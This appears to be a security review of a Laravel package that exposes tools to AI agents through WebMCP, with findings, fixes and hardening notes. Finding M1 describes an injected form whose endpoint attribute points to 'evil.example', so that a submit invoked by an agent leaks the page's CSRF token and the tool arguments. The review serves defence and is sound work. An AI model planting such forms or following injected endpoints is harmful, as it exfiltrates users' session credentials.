# Security review

Scope: the whole package (`src/`, `resources/js`, `resources/views`, routes, config, workbench example), reviewed against the Laravel
checklist (authorization, validation/mass assignment, XSS/template injection, CSRF/sessions, SSRF/path traversal, deserialization,
MCP-specific risks, configuration, dependencies). Reviewed state: tests green (PHP and JS), PHPStan level max, `composer audit` and `npm audit` clean.
Verification also ran in a real Chrome 152 against the workbench with real Livewire 4 and Alpine.

## Summary

| Severity         | Count | Status                           |
|------------------|-------|----------------------------------|
| High             | 0     | –                                |
| Medium           | 2     | 1 fixed, 1 documented (inherent) |
| Low              | 3     | fixed                            |
| Info / hardening | 8     | documented                       |

No finding was exploitable against the default configuration of the package alone; the Medium findings need either injected HTML on the page or a stolen bearer token.

## Findings

### M1 – The runtime sent requests to URLs taken from the DOM (CSRF token leak) – fixed
- **Where:** `resources/js/webmcp-core.js` (`callSession`, `callBridge`, `doRefresh`, `postTool`), `webmcp-forms.js`.
- **Status:** Likely (needs stored HTML injection that survives your sanitizer: `<script type=application/json data-webmcp-manifest>` is stripped by any sane sanitizer, but a `<form data-webmcp-endpoint=...>` is not script).
- **Problem:** Endpoint URLs come from JSON and attributes in the page. An injected form with `data-webmcp-endpoint="https://evil.example/x"` and an agent-invoked submit made `postTool()` send the page CSRF token (`<meta name="csrf-token">`) and the arguments to the attacker.
- **Fix:** every request goes through one `fetch` wrapper that only accepts the page's own origin (`Cross-origin requests are not allowed.`). Tests: `same-origin only`, `injected forms` in `js-tests`.

### M2 – Bridge mode: opt-in cannot be enforced against a holder of a bearer token – documented
- **Where:** `Mcp::web()` semantics, `EnforceWebMcpExposure`.
- **Status:** Inherent, hardening documented.
- **Problem:** `Mcp::web()` serves every tool of the server to any caller with access. The guard enforces `#[WebMcp]` for cookie-authenticated and marker-header requests, but a script that holds a bearer token (kept in JS) can omit both and has the token's full power.
- **Mitigation:** use Session mode where possible; scope tokens (Sanctum abilities/Passport scopes); set `bridge.enforce=always` when the endpoint serves only WebMCP; do not keep long-lived tokens in page-readable storage. `webmcp:check` warns when the guard is disabled.

### L1 – `?` and `#` accepted in resource URI variables – fixed
- **Where:** `ResourceVariables::isDangerous()`.
- **Problem:** `parse_url()` based handlers see a different path/query when a variable contains `?` or `#`.
- **Fix:** both are rejected (also percent-encoded and double-encoded). Tests in `SessionModeTest`.

### L2 – `javascript:` / `data:` / `vbscript:` as form `action` – fixed
- **Where:** `<x-webmcp::form action>`. **Fix:** rejected with an exception.

### L3 – Livewire validation errors invisible to the agent – fixed
- **Where:** Livewire swallows `ValidationException` in actions; errors of `Validator::make()` are not persisted. An agent saw "Done." for a failed call.
- **Fix:** `ReportsValidationErrors` component hook (registered in `register()`, before Livewire boots) sends a `webmcpErrors` effect; the adapter reads it (`$interceptMessage` on Livewire 4, `commit`/`succeed` on 3).

### Info / hardening (documented in the README)
1. **Session routes have no `auth` middleware by default.** Guests only get tools whose `shouldRegister()` allows guests. Add `auth` to `routes.middleware` when every tool needs a login.
2. **Manifest cache:** guests share one entry; `shouldRegister()` depending on IP/flags/time needs `#[WebMcp(cache: false)]`. The cache stores serialized DTOs: use a trusted cache store.
3. **Resource variables:** the checks stop path traversal and encoded separators; Unicode look-alikes (e.g. fullwidth dots) are not normalized. Use `#[WebMcp(variablePattern: ...)]` for path-like values.
4. **Static resources** are protected by `shouldRegister()` and your handler only, unless the class implements `AuthorizesWebMcpRead`.
5. **Confirmation** (client hook and server token) is not proof of a user gesture; real protection is authorization, rate limits and the audit log.
6. **Rate limiting** keys on user, else IP: behind a proxy configure trusted proxies. The Bridge route is not rate-limited by the package.
7. **`app.debug=true`** makes laravel/mcp put exception messages into tool results; never in production.
8. **Audit log masking** is key-based; secrets inside free-text values are not recognized.
9. **Declarative forms** declare tools by HTML. Sanitize user-generated HTML so it cannot contain `toolname` / `data-webmcp-*` attributes.
10. **Livewire:** `#[WebMcpAction]` and `webMcpAvailable()` are not authorization; authorize inside the method (Livewire runs the method for every caller anyway).

## Checked and found in order

- Opt-in/default deny, `exposeAll` only on a server; prompts and `AppResource`s never exposed; `shouldRegister` on every call; tools of the wrong mode or entry point answer 404 like unknown ones (no enumeration).
- Session routes: CSRF through the `web` group (419 verified outside the testing environment), `Origin`/`Sec-Fetch-Site`, JSON-only, body limit, throttle.
- Output: manifest JSON embedded with `HEX_TAG|HEX_AMP|HEX_APOS|HEX_QUOT`; component returns a View, never a Blade string (no `{{ }}` in tool descriptions is ever compiled); attributes escaped; nonce escaped.
- No outbound HTTP, no shell, no file access from user input, no `unserialize` of request data, no redirects from user input (SSRF, command injection, open redirect: not applicable).
- No class names, paths or secrets in the manifest; `exposedTo` only from a config allowlist and only secure origins.
- Mass assignment: not applicable (arguments go to the tool's own validation); Livewire actions need explicit attributes.
- Dependencies: `composer audit` clean, `npm audit` clean (vitest upgraded for an advisory).

## Not reviewed

Your tools' own authorization and validation, your Sanctum/Passport setup, server/proxy/TLS configuration, your CSP header as a whole,
real-browser behavior of the WebMCP API itself (only a spec-faithful mock and a manual run with a test double were available).
